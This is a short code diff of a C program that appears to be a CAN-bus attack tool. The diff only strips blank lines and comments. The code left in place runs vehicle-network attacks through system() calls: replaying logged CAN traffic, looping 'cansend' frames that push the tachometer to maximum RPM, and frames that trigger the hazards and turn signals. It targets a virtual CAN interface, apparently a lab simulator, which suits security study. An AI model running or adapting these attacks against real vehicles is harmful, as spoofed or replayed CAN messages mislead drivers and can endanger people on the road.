@@ -17,14 +17,11 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-
 #include <net/if.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
-
 #include <linux/can.h>
 #include <linux/can/raw.h>
-
 #include "lib.h"
 
 int attack_menu(void){
@@ -43,10 +40,6 @@ int attack_menu(void){
 }
 
 void replay_attack(void){
-    //call "candump vcan0 -l"
-    //send a "CTRL+C" after specified number of seconds to quit logging
-    //call "canplayer -I canfile.log" on the latest logfile to replay
-
     system("candump vcan0 -l -o mylogfile.log");
 
     int logging_time = 0;
@@ -61,7 +54,6 @@ void replay_attack(void){
 }
 
 void tachometer_spoofing(void){
-    //call "while true; do cansend vcan0 244#000000AAFF; done"
     //spoofs tachometer to the max RPM
     while(true){
         system("cansend vcan0 244#000000FFFF");
@@ -69,8 +61,6 @@ void tachometer_spoofing(void){
 }
 
 void turnsignal_spoofing(void){
-    //call "while true; do cansend vcan0 188#03; sleep 0.75; cansend vcan0 188#01;
-    //sleep 0.75; done"
     //turns on hazards then blinks the left signal and repeats
     while(true){
         system("cansend vcan0 188#03");
